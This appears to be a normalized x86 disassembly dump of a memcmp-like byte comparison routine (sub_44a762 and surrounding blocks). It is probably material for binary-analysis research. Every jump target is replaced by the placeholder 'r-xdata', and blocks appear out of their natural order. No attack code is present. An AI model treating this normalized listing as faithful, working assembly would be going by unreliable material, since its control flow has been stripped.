lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_44a762
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi 0x20
jb r-xdata
add edx edi
add ecx edi
cmp edi 0x1f
ja r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_44be82 ]
mov eax ebx
movzx esi al
movzx eax [ ecx ]
sub esi eax
je r-xdata
mov eax [ edx - 0x1c ]
cmp eax [ ecx - 0x1c ]
je r-xdata
mov eax [ edx - 0x18 ]
cmp eax [ ecx - 0x18 ]
je r-xdata
mov eax [ edx - 0x14 ]
cmp eax [ ecx - 0x14 ]
je r-xdata
mov eax [ edx - 0x10 ]
cmp eax [ ecx - 0x10 ]
je r-xdata
mov eax [ edx - 0xc ]
cmp eax [ ecx - 0xc ]
je r-xdata
mov eax [ edx - 0x8 ]
cmp eax [ ecx - 0x8 ]
je r-xdata
mov eax [ edx - 0x4 ]
cmp eax [ ecx - 0x4 ]
je r-xdata
mov eax [ edx - 0x1d ]
cmp eax [ ecx - 0x1d ]
je r-xdata
mov eax [ edx - 0x19 ]
cmp eax [ ecx - 0x19 ]
je r-xdata
mov eax [ edx - 0x15 ]
cmp eax [ ecx - 0x15 ]
je r-xdata
mov eax [ edx - 0x11 ]
cmp eax [ ecx - 0x11 ]
je r-xdata
mov eax [ edx - 0xd ]
cmp eax [ ecx - 0xd ]
je r-xdata
mov eax [ edx - 0x9 ]
cmp eax [ ecx - 0x9 ]
je r-xdata
mov eax [ edx - 0x5 ]
cmp eax [ ecx - 0x5 ]
je r-xdata
movzx edx [ edx - 0x1 ]
movzx eax [ ecx - 0x1 ]
sub edx eax
je r-xdata
mov eax [ edx - 0x1e ]
cmp eax [ ecx - 0x1e ]
je r-xdata
mov eax [ edx - 0x1a ]
cmp eax [ ecx - 0x1a ]
je r-xdata
mov eax [ edx - 0x16 ]
cmp eax [ ecx - 0x16 ]
je r-xdata
mov eax [ edx - 0x12 ]
cmp eax [ ecx - 0x12 ]
je r-xdata
mov eax [ edx - 0xe ]
cmp eax [ ecx - 0xe ]
je r-xdata
mov eax [ edx - 0xa ]
cmp eax [ ecx - 0xa ]
je r-xdata
mov eax [ edx - 0x6 ]
cmp eax [ ecx - 0x6 ]
je r-xdata
mov ax [ edx - 0x2 ]
cmp ax [ ecx - 0x2 ]
je r-xdata
mov eax [ edx - 0x1f ]
cmp eax [ ecx - 0x1f ]
je r-xdata
mov eax [ edx - 0x1b ]
cmp eax [ ecx - 0x1b ]
je r-xdata
mov eax [ edx - 0x17 ]
cmp eax [ ecx - 0x17 ]
je r-xdata
mov eax [ edx - 0x13 ]
cmp eax [ ecx - 0x13 ]
je r-xdata
mov eax [ edx - 0xf ]
cmp eax [ ecx - 0xf ]
je r-xdata
mov eax [ edx - 0xb ]
cmp eax [ ecx - 0xb ]
je r-xdata
mov eax [ edx - 0x7 ]
cmp eax [ ecx - 0x7 ]
je r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
movzx esi [ edx + 0x1 ]
movzx eax [ ecx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ebx
movzx eax [ ecx - 0x1c ]
movzx esi [ edx - 0x1c ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x18 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x14 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x10 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xc ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x8 ]
sub esi eax
je r-xdata
test ebx ebx
jne r-xdata
movzx esi al
movzx eax [ ecx - 0x4 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x1d ]
sub esi eax
je r-xdata
mov eax ebx
movzx eax [ ecx - 0x19 ]
movzx esi [ edx - 0x19 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x15 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x11 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xd ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x9 ]
sub esi eax
je r-xdata
test ebx ebx
je r-xdata
movzx esi al
movzx eax [ ecx - 0x5 ]
sub esi eax
je r-xdata
mov eax edx
jmp r-xdata
xor eax eax
test edx edx
setg al
lea edx [ eax * 2 - 0x1 ]
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x1e ]
sub esi eax
je r-xdata
mov eax ebx
movzx eax [ ecx - 0x1a ]
movzx esi [ edx - 0x1a ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x16 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x12 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xe ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xa ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x6 ]
sub esi eax
je r-xdata
mov eax ebx
jmp r-xdata
movzx esi al
movzx eax [ ecx - 0x2 ]
sub esi eax
je r-xdata
mov eax ebx
movzx eax [ ecx - 0x1f ]
movzx esi [ edx - 0x1f ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x1b ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x17 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x13 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xf ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xb ]
sub esi eax
je r-xdata
test ebx ebx
jne r-xdata
movzx esi al
movzx eax [ ecx - 0x7 ]
sub esi eax
je r-xdata
movzx esi [ edx - 0x2 ]
movzx eax [ ecx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x4 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x2 ]
movzx eax [ ecx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1b ]
movzx eax [ ecx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x17 ]
movzx eax [ ecx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x13 ]
movzx eax [ ecx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xf ]
movzx eax [ ecx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xb ]
movzx eax [ ecx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x7 ]
movzx eax [ ecx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1c ]
movzx eax [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x18 ]
movzx eax [ ecx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x14 ]
movzx eax [ ecx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x10 ]
movzx eax [ ecx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xc ]
movzx eax [ ecx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x8 ]
movzx eax [ ecx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x4 ]
movzx eax [ ecx - 0x4 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1d ]
movzx eax [ ecx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x19 ]
movzx eax [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x15 ]
movzx eax [ ecx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x11 ]
movzx eax [ ecx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xd ]
movzx eax [ ecx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x9 ]
movzx eax [ ecx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x5 ]
movzx eax [ ecx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x1 ]
movzx eax [ ecx - 0x1 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1e ]
movzx eax [ ecx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1a ]
movzx eax [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x16 ]
movzx eax [ ecx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x12 ]
movzx eax [ ecx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xe ]
movzx eax [ ecx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xa ]
movzx eax [ ecx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x6 ]
movzx eax [ ecx - 0x6 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ edx + 0x8 ]
cmp eax [ ecx + 0x8 ]
je r-xdata
movzx esi [ edx + 0x5 ]
movzx eax [ ecx + 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x3 ]
movzx eax [ ecx + 0x3 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1a ]
movzx eax [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x16 ]
movzx eax [ ecx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x12 ]
movzx eax [ ecx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xe ]
movzx eax [ ecx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xa ]
movzx eax [ ecx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x6 ]
movzx eax [ ecx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x2 ]
movzx eax [ ecx - 0x2 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1b ]
movzx eax [ ecx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x17 ]
movzx eax [ ecx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x13 ]
movzx eax [ ecx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xf ]
movzx eax [ ecx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xb ]
movzx eax [ ecx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x7 ]
movzx eax [ ecx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1c ]
movzx eax [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x18 ]
movzx eax [ ecx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x14 ]
movzx eax [ ecx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x10 ]
movzx eax [ ecx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xc ]
movzx eax [ ecx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x8 ]
movzx eax [ ecx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x4 ]
movzx eax [ ecx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx esi [ edx - 0x1d ]
movzx eax [ ecx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x19 ]
movzx eax [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x15 ]
movzx eax [ ecx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x11 ]
movzx eax [ ecx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xd ]
movzx eax [ ecx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x9 ]
movzx eax [ ecx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x5 ]
movzx eax [ ecx - 0x5 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
jmp r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x8 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x6 ]
movzx eax [ ecx + 0x6 ]
sub esi eax
